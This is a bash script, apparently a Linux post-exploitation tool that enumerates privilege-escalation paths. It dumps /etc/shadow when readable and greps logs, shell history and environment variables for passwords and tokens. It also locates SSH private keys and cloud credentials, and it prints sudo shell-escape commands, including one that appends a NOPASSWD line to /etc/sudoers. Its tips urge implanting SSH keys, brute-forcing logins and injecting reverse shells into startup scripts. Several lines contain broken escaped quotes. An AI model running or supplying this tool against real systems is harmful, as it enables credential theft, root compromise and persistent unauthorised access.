#!/bin/bash

# Define log file
LOG_FILE="ultimate_enum.log"

# Clear previous log
> "$LOG_FILE"

# Color Definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

SHADOW_READABLE=""
PKG_BACKDOORS_FOUND=""
CLOUD_CREDS_FOUND=""
NETWORK_SSH=""
NETWORK_WEB=""
NETWORK_DB=""
NETWORK_PUBLIC_LISTEN=""
SOCKETS_FOUND=""
WRITABLE_CRONS_FOUND=""
HIGH_ENTROPY_FOUND=""
CUSTOM_ROOT_PROC_FOUND=""

# Central logging function
log() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

log "${BLUE}[*] Running enhanced low-privilege enumeration script...${NC}"
log "${BLUE}[*] Results will be saved in $LOG_FILE${NC}"

# ------------------- CONTAINER / VIRTUALIZATION DETECTION -------------------
log "${YELLOW}\n[+] Checking for container or virtualization environment:${NC}"

VIRT_ENV=""

# Docker / LXC detection via cgroups
if grep -qE 'docker|lxc' /proc/1/cgroup 2>/dev/null; then
    VIRT_ENV="Container (Docker/LXC)"
    log "${GREEN}[+] Detected: $VIRT_ENV${NC}"
elif command -v systemd-detect-virt &>/dev/null && systemd-detect-virt -q; then
    VIRT_ENV=$(systemd-detect-virt)
    log "${GREEN}[+] Detected Virtual Environment: $VIRT_ENV${NC}"
else
    log "${YELLOW}[-] No obvious container or virtualization environment detected.${NC}"
fi

if [[ -n "$VIRT_ENV" ]]; then
    log "${GREEN}[+] TIP:${NC} You appear to be in a $VIRT_ENV — escalation may be limited by isolation, but check for container escapes or weak VM boundaries."
    log "${GREEN}    Tools like 'escape.sh', CVE-2022-0492, or misconfigured mounts may help in containerized environments.${NC}"
else
    log "${YELLOW}[+] TIP:${NC} No virtualization detected — you may be on bare metal or a hardened guest system. Escalation may be more straightforward.${NC}"
fi

# ------------------- SYSTEM ENUMERATION -------------------
log "${YELLOW}\n[+] Host Information:${NC}"
log "Hostname: $(hostname)"
log "OS: $(uname -s) $(uname -r) $(uname -v)"
log "Architecture: $(uname -m)"

KERNEL_VERSION=$(uname -r)
log "${YELLOW}\n[+] Kernel and CPU Information:${NC}"
log "Kernel Version: $KERNEL_VERSION"
log "CPU Model: $(lscpu | grep 'Model name' | awk -F: '{print $2}' | xargs)"
log "CPU Cores: $(lscpu | grep '^CPU(s):' | awk '{print $2}')"
log "Threads per Core: $(lscpu | grep 'Thread(s) per core:' | awk '{print $4}')"
log "Total Threads: $(($(nproc)))"

log "${GREEN}\n[+] TIP:${NC} Based on the system info, look for kernel-specific exploits that match version $KERNEL_VERSION."
log "${GREEN}    You can also assess performance-heavy exploits since the system has $(nproc) threads available.${NC}"

# ------------------- KERNEL EXPLOIT SUGGESTIONS -------------------
log "${YELLOW}\n[+] Searching for Known Kernel Exploits:${NC}"
curl -s "https://www.exploit-db.com/search?text=$KERNEL_VERSION" | grep -o 'CVE-[0-9]\{4\}-[0-9]\{4,5\}' | sort -u | tee -a "$LOG_FILE"

log "${GREEN}\n[+] TIP:${NC} Review the listed CVEs on Exploit-DB or Google them to find PoCs and exploitation guides."
log "${GREEN}    Use tools like searchsploit or exploitdb.com to see if any are local privilege escalation exploits relevant to your kernel.${NC}"

# ------------------- NETWORK ENUMERATION -------------------
log "${YELLOW}\n[+] Enumerating Network Interfaces, Open Ports, and Listening Services:${NC}"

log "${BLUE}[>] Network Interfaces and IP Addresses:${NC}"
ip a | tee -a "$LOG_FILE"

log "${BLUE}[>] Routing Table:${NC}"
ip route | tee -a "$LOG_FILE"

log "${BLUE}[>] Listening Services (TCP/UDP):${NC}"
LISTENING=$(ss -tulnp 2>/dev/null | tee -a "$LOG_FILE")

# If ss doesn't work, fallback to netstat
if [[ -z "$LISTENING" ]]; then
    LISTENING=$(netstat -tulnp 2>/dev/null | tee -a "$LOG_FILE")
fi

if echo "$LISTENING" | grep -q ':22'; then
    NETWORK_SSH=true
    log "${GREEN}[+] TIP:${NC} SSH is running. If weak passwords or key-based auth are used, try bruteforce or key reuse attacks."
fi

if echo "$LISTENING" | grep -q ':80\|:443'; then
    NETWORK_WEB=true
    log "${GREEN}[+] TIP:${NC} Web service detected. Check for hidden directories with dirb/ffuf or SSRF, LFI, RCE issues."
fi

if echo "$LISTENING" | grep -q ':3306'; then
    NETWORK_DB=true
    log "${GREEN}[+] TIP:${NC} MySQL is running. Look for weak creds or readable config files with saved DB passwords."
fi

if echo "$LISTENING" | grep -q '0\.0\.0\.0'; then
    NETWORK_PUBLIC_LISTEN=true
    log "${GREEN}[+] TIP:${NC} Services are listening on 0.0.0.0 (all interfaces). These may be remotely accessible — check firewall rules or test from another host.${NC}"
fi

log "${BLUE}[>] Established Connections:${NC}"
ss -tunap 2>/dev/null | grep ESTAB | tee -a "$LOG_FILE"

if echo "$LISTENING" | grep -q ':22'; then
    log "${GREEN}[+] TIP:${NC} SSH is running. If weak passwords or key-based auth are used, try bruteforce or key reuse attacks."
fi

if echo "$LISTENING" | grep -q ':80\|:443'; then
    log "${GREEN}[+] TIP:${NC} Web service detected. Check for hidden directories with dirb/ffuf or SSRF, LFI, RCE issues."
fi

if echo "$LISTENING" | grep -q ':3306'; then
    log "${GREEN}[+] TIP:${NC} MySQL is running. Look for weak creds or readable config files with saved DB passwords."
fi

if echo "$LISTENING" | grep -q '0\.0\.0\.0'; then
    log "${GREEN}[+] TIP:${NC} Some services are listening on 0.0.0.0 (all interfaces). These may be remotely accessible — check firewall rules or test from another machine if you can.${NC}"
fi

if echo "$LISTENING" | grep -q ':1[0-9][0-9][0-9]'; then
    log "${GREEN}[+] TIP:${NC} High ports detected — might indicate development services or admin tools (e.g., NodeJS, Rails, custom apps). Try connecting directly or scanning for endpoints.${NC}"
fi


# ------------------- SUDO PRIVILEGE ESCALATION CHECKS -------------------
log "${YELLOW}\n[+] Checking Sudo Capabilities:${NC}"
SUDO_CMDS=$(sudo -n -l 2>/dev/null)

if [[ -z "$SUDO_CMDS" ]]; then
    log "${RED}[-] No sudo privileges detected.${NC}"
else
    log "$SUDO_CMDS"

    if sudo -n -l 2>/dev/null | grep -q "NOPASSWD"; then
        log "${GREEN}[!] Some sudo commands can be run without a password!${NC}"
    fi

    declare -A SUDO_EXPLOITS=(
        ["find"]="sudo find . -exec /bin/sh \; -quit"
        ["vim"]="sudo vim -c ':!/bin/sh'"
        ["tar"]="sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
        ["python3"]="sudo python3 -c 'import os; os.system(\"/bin/sh\")'"
        ["perl"]="sudo perl -e 'exec \"/bin/sh\";'"
        ["awk"]="sudo awk 'BEGIN {system(\"/bin/sh\")}'"
        ["nmap"]="sudo nmap --interactive; !sh"
        ["less"]="sudo less /etc/passwd; !sh"
        ["nano"]="sudo nano /etc/sudoers"
        ["cp"]="sudo cp /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh"
        ["tee"]="echo \"user ALL=(ALL) NOPASSWD:ALL\" | sudo tee -a /etc/sudoers"
        ["bash"]="sudo bash"
        ["sh"]="sudo sh"
        ["lua"]="sudo lua -e 'os.execute(\"/bin/sh\")'"
        ["ruby"]="sudo ruby -e 'exec \"/bin/sh\"'"
        ["php"]="sudo php -r 'system(\"/bin/sh\");'"
    )

    for CMD in "${!SUDO_EXPLOITS[@]}"; do
        if echo "$SUDO_CMDS" | grep -q "$CMD"; then
            log "${GREEN}[!] Exploitation Tip: Run: ${SUDO_EXPLOITS[$CMD]}${NC}"
        fi
    done
fi

# ------------------- COMMAND HISTORY CHECK -------------------
log "${YELLOW}\n[+] Checking Command History for Sensitive Information:${NC}"
CMD_HISTORY=$(grep -E "password|passwd|token|apikey|secret|sudo|su |chmod|chown|scp|ssh" ~/.bash_history ~/.zsh_history 2>/dev/null)
echo "$CMD_HISTORY" | tee -a "$LOG_FILE"

if [[ -n "$CMD_HISTORY" ]]; then
    log "${GREEN}\n[+] TIP:${NC} Shell history shows potential attack vectors."
    log "${GREEN}    You may be able to reuse sudo commands, credentials, or exploit custom tools/scripts run previously by the user.${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No obvious sensitive entries found in shell history, but consider manually inspecting .bash_history or .zsh_history."
    log "${YELLOW}    Secrets or useful patterns may still be stored in non-obvious ways or buried in long command chains.${NC}"
fi

# ------------------- USER ENUMERATION -------------------
log "${YELLOW}\n[+] Enumerating System Users:${NC}"
getent passwd | awk -F: '{ print $1 " (UID: " $3 ", GID: " $4 ", Home: " $6 ", Shell: " $7 ")" }' | tee -a "$LOG_FILE"

log "${YELLOW}\n[+] Current Logged-in Users:${NC}"
who | tee -a "$LOG_FILE"

log "${YELLOW}\n[+] Last Logins:${NC}"
last -a | head -n 10 | tee -a "$LOG_FILE"

log "${GREEN}\n[+] TIP:${NC} Look for users with UID 0 (root-level), unusual shells (e.g., /bin/sh, /bin/false), or empty home directories."
log "${GREEN}    These accounts might be service users, misconfigured, or potential escalation targets if they're less secured.${NC}"

# ------------------- SHADOW FILE ACCESS / PASSWORD REUSE CHECK -------------------
log "${YELLOW}\n[+] Checking for readable /etc/shadow file:${NC}"

if [[ -r /etc/shadow ]]; then
    SHADOW_READABLE=true
    log "${GREEN}[!] /etc/shadow is readable! This file stores password hashes for all users.${NC}"
    grep -vE '^#' /etc/shadow | tee -a "$LOG_FILE"

    log "${GREEN}[+] TIP:${NC} You can try cracking these password hashes using tools like john or hashcat."
    log "${GREEN}    Also check for hash reuse across users — some admins reuse passwords across accounts, services, or systems.${NC}"
else
    log "${YELLOW}[-] /etc/shadow is not readable. This is expected on hardened systems.${NC}"
    log "${YELLOW}[+] TIP:${NC} If you're able to escalate to read /etc/shadow later, extract hashes and look for password reuse or weak credentials.${NC}"
fi

# ------------------- PACKAGE-BASED BACKDOOR / SHELL DETECTION -------------------
log "${YELLOW}\n[+] Scanning for suspicious packages or backdoor implants:${NC}"

if command -v dpkg &>/dev/null; then
    log "${BLUE}[>] Checking dpkg for known backdoors/shells:${NC}"
    if dpkg -l | grep -Eiq 'shell|backdoor|reverse|exploit|hack|meterpreter'; then
        PKG_BACKDOORS_FOUND=true
    fi
    dpkg -l | grep -Ei 'shell|backdoor|reverse|exploit|hack|meterpreter' | tee -a "$LOG_FILE"
fi

if command -v rpm &>/dev/null; then
    log "${BLUE}[>] Checking rpm for suspicious packages:${NC}"
    if rpm -qa | grep -Eiq 'shell|backdoor|reverse|exploit|hack|meterpreter'; then
        PKG_BACKDOORS_FOUND=true
    fi
    rpm -qa | grep -Ei 'shell|backdoor|reverse|exploit|hack|meterpreter' | tee -a "$LOG_FILE"
fi

if command -v pip &>/dev/null; then
    log "${BLUE}[>] Checking pip packages for sketchy modules:${NC}"
    if pip list | grep -Eiq 'pty|shell|pwntools|backdoor|revshell|rce|payload'; then
        PKG_BACKDOORS_FOUND=true
    fi
    pip list | grep -Ei 'pty|shell|pwntools|backdoor|revshell|rce|payload' | tee -a "$LOG_FILE"
fi

if command -v npm &>/dev/null; then
    log "${BLUE}[>] Checking npm modules for suspicious packages:${NC}"
    if npm list -g --depth=0 2>/dev/null | grep -Eiq 'shell|reverse|payload|rce|backdoor'; then
        PKG_BACKDOORS_FOUND=true
    fi
    npm list -g --depth=0 2>/dev/null | grep -Ei 'shell|reverse|payload|rce|backdoor' | tee -a "$LOG_FILE"
fi

# ------------------- CRON JOB EXPLOIT CHECK -------------------
log "${YELLOW}\n[+] Checking for Scheduled Cron Jobs:${NC}"
CRON_JOBS=$(crontab -l 2>/dev/null; cat /etc/crontab /etc/cron.d/* 2>/dev/null)

if [[ -n "$CRON_JOBS" ]]; then
    log "$CRON_JOBS"
    log "${GREEN}[+] Checking for Writable Cron Scripts:${NC}"
    WRITABLE_CRON_SCRIPTS=$(find /etc/cron* -type f -writable 2>/dev/null)
    
    if [[ -n "$WRITABLE_CRON_SCRIPTS" ]]; then
        log "$WRITABLE_CRON_SCRIPTS"
        WRITABLE_CRONS_FOUND=true
    fi
else
    log "${RED}[-] No cron jobs found.${NC}"
fi

log "${GREEN}\n[+] TIP:${NC} Writable cron jobs or scripts can be hijacked to execute arbitrary code as root or another user."
log "${GREEN}    Look for scripts owned by root or run by privileged accounts — especially if you can modify them or their path dependencies.${NC}"

# ------------------- SUID & SGID BINARY CHECK -------------------
log "${YELLOW}\n[+] Searching for SUID binaries:${NC}"
find / -perm -4000 -type f 2>/dev/null | tee -a "$LOG_FILE"

SUID_RESULTS=$(find / -perm -4000 -type f 2>/dev/null)

if [[ -n "$SUID_RESULTS" ]]; then
    log "${GREEN}\n[+] TIP:${NC} Some binaries have the SUID bit set, meaning they run as their owner (often root)."
    log "${GREEN}    Check uncommon SUID binaries (outside /usr/bin or /bin) and cross-reference them on GTFOBins (https://gtfobins.github.io/) for known exploits.${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No SUID binaries found. Either the system is hardened, or this user has limited visibility."
    log "${YELLOW}    Consider checking inside mounted filesystems, containers, or backups if accessible.${NC}"
fi

# ------------------- LATERAL MOVEMENT CHECKS -------------------
log "${YELLOW}\n[+] Checking for Readable Home Directories:${NC}"
READABLE_HOMES=$(find /home -maxdepth 1 -type d -perm -o+r 2>/dev/null)
echo "$READABLE_HOMES" | tee -a "$LOG_FILE"

log "${YELLOW}\n[+] Searching for Other Users' SSH Private Keys:${NC}"
SSH_KEYS=$(find /home -type f -name "id_rsa" -o -name "*.pem" 2>/dev/null)
echo "$SSH_KEYS" | tee -a "$LOG_FILE"

if [[ -n "$READABLE_HOMES" ]]; then
    log "${GREEN}\n[+] TIP:${NC} Some home directories are world-readable. Look for files like .bash_history, .ssh/config, .git-credentials, or saved scripts."
    for USERDIR in $READABLE_HOMES; do
        log "${BLUE}    [>] Scanning $USERDIR for common artifacts...${NC}"
        find "$USERDIR" -maxdepth 2 -type f \( -name \"*.sh\" -o -name \".bash_history\" -o -name \"authorized_keys\" -o -name \".git-credentials\" \) 2>/dev/null | tee -a \"$LOG_FILE\"
    done
fi

if [[ -n "$SSH_KEYS" ]]; then
    log "${GREEN}[+] TIP:${NC} SSH private keys found! Try using them to pivot into user accounts or onto other systems (check for reused keys)."
fi

log "${YELLOW}\n[+] Checking for Writable .ssh Directories (Potential for Key Implanting):${NC}"
WRITABLE_SSH_DIRS=$(find /home -type d -name \".ssh\" -perm -o+w 2>/dev/null)
echo \"$WRITABLE_SSH_DIRS\" | tee -a \"$LOG_FILE\"

if [[ -n \"$WRITABLE_SSH_DIRS\" ]]; then
    log \"${GREEN}[+] TIP:${NC} Writable .ssh directories found. You may be able to implant your own public key and access the account without password!\"\nfi

log "${YELLOW}\n[+] Checking for Writable authorized_keys Files (Persistence Vectors):${NC}"
WRITABLE_AUTH_KEYS=$(find /home -type f -name "authorized_keys" -perm -o+w 2>/dev/null)

if [[ -n "$WRITABLE_AUTH_KEYS" ]]; then
    echo "$WRITABLE_AUTH_KEYS" | tee -a "$LOG_FILE"
    log "${GREEN}[+] TIP:${NC} Writable authorized_keys files found!"
    log "${GREEN}    You can implant your own public key for persistent access to these accounts without passwords.${NC}"
else
    log "${YELLOW}[-] No writable authorized_keys files found.${NC}"
    log "${YELLOW}[+] TIP:${NC} If you gain write access to a user’s home later, consider adding a public key to ~/.ssh/authorized_keys for backdoor access.${NC}"
fi

while IFS= read -r FILE; do
    OWNER=$(stat -c '%U' "$FILE")
    if id -u "$OWNER" 2>/dev/null | grep -q '^0$'; then
        log "${RED}[!] WARNING:${NC} Writable authorized_keys for root! That’s game over if exploited properly."
    fi
done <<< "$WRITABLE_AUTH_KEYS"

if [[ -n "$WRITABLE_AUTH_KEYS" ]]; then
    AUTH_KEYS_WRITABLE=true
fi


# ------------------- CREDENTIAL DISCOVERY -------------------
log "${YELLOW}\n[+] Checking logs for sensitive information (passwords, tokens, API keys):${NC}"
grep -rniE "password|passwd|token|apikey|secret|bearer|authorization|jwt" /var/log /etc /opt /home/*/.bash_history 2>/dev/null | tee -a "$LOG_FILE"

log "${YELLOW}\n[+] Looking for high-entropy strings (potential secrets):${NC}"
find /var/log /etc /opt /home -type f -exec grep -Eo '[A-Za-z0-9+/]{30,}' {} \; 2>/dev/null | sort -u | tee -a "$LOG_FILE"

if find /var/log /etc /opt /home -type f -exec grep -Eo '[A-Za-z0-9+/]{30,}' {} \; 2>/dev/null | grep -q .; then
    HIGH_ENTROPY_FOUND=true
fi

if grep -rniE "password|passwd|token|apikey|secret|bearer|authorization|jwt" /var/log /etc /opt /home/*/.bash_history 2>/dev/null | grep -q .; then
    log "${GREEN}\n[+] TIP:${NC} Sensitive credentials or tokens were found in readable files or logs."
    log "${GREEN}    Try using these values in authentication attempts, API requests, or service logins. Be sure to check if they're still valid.${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No obvious credentials found, but secrets can also be stored in configs or environment variables not matched by keywords."
    log "${YELLOW}    Consider manually inspecting key config files in /opt, /etc, and home directories for hidden creds.${NC}"
fi

# ------------------- CLOUD CREDENTIAL DISCOVERY -------------------
log "${YELLOW}\n[+] Checking for cloud provider credentials:${NC}"

AWS_CREDS=$(find /home /root -type f \( -name "credentials" -o -name "config" \) -path "*/.aws/*" 2>/dev/null)
GCP_CREDS=$(find /home /root -type f -name "*.json" -path "*/.config/gcloud/*" 2>/dev/null)
AZURE_CREDS=$(find /home /root -type f -name "*.json" -path "*/.azure/*" 2>/dev/null)
DO_CREDS=$(find /home /root -type f -path "*/.config/doctl/*" 2>/dev/null)

if [[ -n "$AWS_CREDS" || -n "$GCP_CREDS" || -n "$AZURE_CREDS" || -n "$DO_CREDS" ]]; then
    CLOUD_CREDS_FOUND=true
fi
# ------------------- FILE PERMISSION EXPLOITATION -------------------
log "${YELLOW}\n[+] Checking for Writable Security Files:${NC}"
find /etc -type f -perm -g=w,o=w 2>/dev/null | tee -a "$LOG_FILE"

log "${YELLOW}\n[+] Searching for Writable Root-Owned Scripts:${NC}"
find /usr/local/bin /usr/bin /bin /sbin -type f -perm -002 -user root 2>/dev/null | tee -a "$LOG_FILE"

WRITABLE_SECURITY=$(find /etc -type f -perm -g=w,o=w 2>/dev/null | grep -q .)
WRITABLE_ROOT_SCRIPTS=$(find /usr/local/bin /usr/bin /bin /sbin -type f -perm -002 -user root 2>/dev/null | grep -q .)

if $WRITABLE_SECURITY || $WRITABLE_ROOT_SCRIPTS; then
    log "${GREEN}\n[+] TIP:${NC} Writable config files or root-owned scripts were found. Try injecting malicious commands to escalate privileges."
    log "${GREEN}    For scripts, modify them to spawn a shell or backdoor. For configs, abuse misconfigurations (e.g., LD_PRELOAD, PATH hijacks).${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No writable privileged files found, but keep an eye on temp folders, custom scripts, or world-writable directories."
    log "${YELLOW}    You might still find privilege escalation paths through race conditions or poorly isolated services.${NC}"
fi

# ------------------- ENVIRONMENT VARIABLE SECRETS CHECK -------------------
log "${YELLOW}\n[+] Checking environment variables for credentials/secrets:${NC}"
ENV_SECRETS=$(env | grep -iE 'pass|secret|key|token|auth')

if [[ -n "$ENV_SECRETS" ]]; then
    echo "$ENV_SECRETS" | tee -a "$LOG_FILE"
    log "${GREEN}\n[+] TIP:${NC} Potential secrets found in environment variables. Try using these for authentication, API access, or service escalation."
    log "${GREEN}    Be cautious: these could provide tokens, database passwords, or cloud credentials (e.g., AWS, GCP).${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No obvious secrets found in environment variables, but review them manually for base64 or encoded tokens not caught by regex."
    log "${YELLOW}    Environment-based credentials are often used in Docker, cloud, and CI/CD environments.${NC}"
fi

# ------------------- WRITABLE INIT/SYSTEMD SCRIPTS CHECK -------------------
log "${YELLOW}\n[+] Checking for writable startup/init scripts (systemd, init.d):${NC}"
WRITABLE_STARTUP=$(find /etc/init.d /etc/systemd/system -type f -writable 2>/dev/null)

if [[ -n "$WRITABLE_STARTUP" ]]; then
    echo "$WRITABLE_STARTUP" | tee -a "$LOG_FILE"
    log "${GREEN}\n[+] TIP:${NC} Writable startup scripts found! These can be modified to execute arbitrary code as root at boot or service restart."
    log "${GREEN}    Consider injecting reverse shells or privilege escalation payloads. Use with caution if persistence is not your goal.${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No writable init/systemd scripts found. But you can still look for custom services or misconfigured units in /etc/systemd/system/.${NC}"
fi

# ------------------- COMMON MISCONFIGURATIONS CHECK -------------------
log "${YELLOW}\n[+] Checking for world-writable directories in \$PATH:${NC}"
WRITABLE_PATH_DIRS=$(echo "$PATH" | tr ':' '\n' | xargs -I{} find {} -type d -perm -0002 2>/dev/null)

if [[ -n "$WRITABLE_PATH_DIRS" ]]; then
    echo "$WRITABLE_PATH_DIRS" | tee -a "$LOG_FILE"
    log "${GREEN}\n[+] TIP:${NC} Writable directories found in \$PATH. You could hijack binaries or inject malicious scripts to escalate privileges."
    log "${GREEN}    Consider placing a trojan binary in one of these paths if a privileged user executes commands from it.${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No writable directories in \$PATH. But always double-check for user-specific PATH overrides in ~/.bashrc or ~/.profile.${NC}"
fi

log "${YELLOW}\n[+] Checking for LD_PRELOAD or LD_LIBRARY_PATH variables (possible hijack vectors):${NC}"
LD_ENV=$(env | grep -E 'LD_PRELOAD|LD_LIBRARY_PATH')

if [[ -n "$LD_ENV" ]]; then
    echo "$LD_ENV" | tee -a "$LOG_FILE"
    log "${GREEN}\n[+] TIP:${NC} These environment variables can be hijacked if used by vulnerable binaries or scripts."
    log "${GREEN}    Try placing a malicious shared object (.so) file and setting LD_PRELOAD or LD_LIBRARY_PATH to execute it.${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No LD_PRELOAD or LD_LIBRARY_PATH set in current session, but check for usage in startup scripts or service units.${NC}"
fi

# ------------------- BACKGROUND PROCESS / SERVICE OWNERSHIP CHECK -------------------
log "${YELLOW}\n[+] Checking for suspicious root-owned background processes:${NC}"
ROOT_PROCS=$(ps -U root -u root u | grep -vE '(^root.*(sshd|bash|systemd|init|kthreadd|ps|grep))')

if [[ -n "$ROOT_PROCS" ]]; then
    CUSTOM_ROOT_PROC_FOUND=true
    echo "$ROOT_PROCS" | tee -a "$LOG_FILE"
    log "${GREEN}\n[+] TIP:${NC} Found root processes using possibly non-standard binaries. These could be misconfigured services or exploitable scripts."
    log "${GREEN}    Trace the binary path and check for writable files, custom scripts, or unexpected behavior (e.g., home-grown daemons).${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No suspicious root processes found. Consider re-checking inside containers or with full ps aux visibility if access is limited.${NC}"
fi

# ------------------- TEMP FOLDER SCRIPT DISCOVERY -------------------
log "${YELLOW}\n[+] Searching /tmp, /dev/shm, and /var/tmp for scripts or tools:${NC}"
TMP_SCRIPTS=$(find /tmp /dev/shm /var/tmp -type f \\( -iname \"*.sh\" -o -iname \"*.py\" -o -iname \"*.pl\" -o -iname \"*.php\" -o -iname \"*.out\" -o -iname \"*reverse*\" \\) 2>/dev/null)

if [[ -n \"$TMP_SCRIPTS\" ]]; then
    echo \"$TMP_SCRIPTS\" | tee -a \"$LOG_FILE\"
    log \"${GREEN}\\n[+] TIP:${NC} Suspicious scripts or payloads found in temporary directories. These may be remnants from an attacker, dev testing, or scheduled jobs.\"
    log \"${GREEN}    Review them for hardcoded credentials, backdoor code, or signs of lateral movement and escalation tools.${NC}\"
else
    log \"${YELLOW}\\n[+] TIP:${NC} No scripts found in common temp directories. Still worth checking if scripts are being created dynamically or cleaned quickly.${NC}\"
fi

# ------------------- SOCKET FILE & DAEMON EXPOSURE CHECK -------------------
log "${YELLOW}\n[+] Checking for Unix domain sockets (.sock files) and potentially exposed daemons:${NC}"

SOCKET_FILES=$(find /var/run /tmp /dev/shm /run /home -type s 2>/dev/null)
echo "$SOCKET_FILES" | tee -a "$LOG_FILE"

if [[ -n "$SOCKET_FILES" ]]; then
    log "${GREEN}[+] TIP:${NC} Unix socket files found. These are used by local services for inter-process communication."
    log "${GREEN}    Check for world-writable or accessible ones — you may be able to interact with privileged daemons or sniff traffic.${NC}"

    # Highlight interesting or writable ones
    WRITABLE_SOCKS=$(find /var/run /tmp /dev/shm /run /home -type s -perm -o+w 2>/dev/null)
    if [[ -n "$WRITABLE_SOCKS" ]]; then
        echo "$WRITABLE_SOCKS" | tee -a "$LOG_FILE"
        log "${GREEN}[!] Writable socket(s) found — you might interact with higher-privileged services if no auth is enforced.${NC}"
    fi
else
    log "${YELLOW}[-] No socket files found in common IPC directories.${NC}"
fi

if [[ -n "$SOCKET_FILES" ]]; then
    SOCKETS_FOUND=true
fi



# ------------------- BINARY CAPABILITY CHECK -------------------
log "${YELLOW}\n[+] Checking for unusual binary capabilities (via getcap):${NC}"
BIN_CAPS=$(getcap -r / 2>/dev/null | grep -v '^$')

if [[ -n "$BIN_CAPS" ]]; then
    echo "$BIN_CAPS" | tee -a "$LOG_FILE"
    log "${GREEN}\n[+] TIP:${NC} Some binaries have extended capabilities set — these may allow privilege escalation without SUID."
    log "${GREEN}    Look for caps like cap_setuid, cap_sys_admin, cap_dac_override — especially on interpreters like python or node.${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No binaries with special capabilities found. Still, review newly installed tools or custom paths just in case.${NC}"
fi

# ------------------- HIGH-LEVEL FINDINGS SUMMARY -------------------
log "${BLUE}\n[*] High-Level Summary of Key Findings:${NC}"

[[ -n "$VIRT_ENV" ]] && log "${GREEN}[+] Virtualization Detected: $VIRT_ENV${NC}"

[[ -n "$SUDO_CMDS" ]] && log "${GREEN}[+] Sudo Access Detected${NC}"

if [[ "$NETWORK_SSH" || "$NETWORK_WEB" || "$NETWORK_DB" || "$NETWORK_PUBLIC_LISTEN" ]]; then
    log "${GREEN}[+] Network Services Detected — Open Ports or Listening Daemons (e.g., SSH/Web/DB/Public)${NC}"
fi

[[ -n "$SUID_RESULTS" ]] && log "${GREEN}[+] SUID Binaries Present${NC}"

[[ -n "$CMD_HISTORY" ]] && log "${GREEN}[+] Sensitive Commands in Shell History${NC}"

[[ -n "$SHADOW_READABLE" ]] && log "${GREEN}[+] /etc/shadow is Readable — Password Hashes Dumped${NC}"

[[ -n "$PKG_BACKDOORS_FOUND" ]] && log "${GREEN}[+] Suspicious Packages Detected via dpkg/pip/npm${NC}"

[[ -n "$ENV_SECRETS" ]] && log "${GREEN}[+] Secrets Found in Environment Variables${NC}"

[[ -n "$CLOUD_CREDS_FOUND" ]] && log "${GREEN}[+] Cloud Provider Credentials Found (AWS/GCP/Azure/DO)${NC}"

[[ -n "$WRITABLE_STARTUP" ]] && log "${GREEN}[+] Writable Startup Scripts Detected${NC}"

[[ -n "$WRITABLE_PATH_DIRS" ]] && log "${GREEN}[+] Writable Directories in \$PATH${NC}"

[[ -n "$LD_ENV" ]] && log "${GREEN}[+] LD_PRELOAD or LD_LIBRARY_PATH Set${NC}"

[[ -n "$ROOT_PROCS" ]] && log "${GREEN}[+] Suspicious Root-Owned Background Processes${NC}"

[[ -n "$TMP_SCRIPTS" ]] && log "${GREEN}[+] Scripts Found in /tmp or Shared Memory${NC}"

[[ -n "$SSH_KEYS" ]] && log "${GREEN}[+] SSH Private Keys Discovered${NC}"

[[ -n "$WRITABLE_SSH_DIRS" ]] && log "${GREEN}[+] Writable .ssh Directories Detected${NC}"

[[ -n "$SOCKETS_FOUND" ]] && log "${GREEN}[+] Unix Socket Files Detected — Check for Privileged Daemons or IPC Access${NC}"

[[ -n "$AUTH_KEYS_WRITABLE" ]] && log "${GREEN}[+] Writable authorized_keys Files Found — Possible Backdoor/Persistence Vector${NC}"

[[ -n "$WRITABLE_CRONS_FOUND" ]] && log "${GREEN}[+] Writable Cron Jobs or Scripts Found — Possible Code Execution Path${NC}"

[[ -n "$HIGH_ENTROPY_FOUND" ]] && log "${GREEN}[+] High-Entropy Strings Found — May Contain API Keys, JWTs, or Secrets${NC}"

[[ -n "$CUSTOM_ROOT_PROC_FOUND" ]] && log "${GREEN}[+] Non-standard Root-Owned Background Processes Detected — Investigate Binaries or Services${NC}"

if find /etc -type f -perm -g=w,o=w 2>/dev/null | grep -q .; then
    log "${GREEN}[+] Writable Files in /etc${NC}"
fi

if find /usr/local/bin /usr/bin /bin /sbin -type f -perm -002 -user root 2>/dev/null | grep -q .; then
    log "${GREEN}[+] Writable Root-Owned Scripts Detected${NC}"
fi

if getcap -r / 2>/dev/null | grep -q .; then
    log "${GREEN}[+] Binaries with Capabilities Found (getcap)${NC}"
fi

log "${BLUE}==============================================================${NC}"
log "${BLUE}[*] End of Summary — use these leads to guide your next steps.${NC}"
log "${BLUE}==============================================================${NC}"



# ------------------- ENUMERATION COMPLETED -------------------
log "${GREEN}\n[+] Enumeration completed. Check results in: $LOG_FILE${NC}"
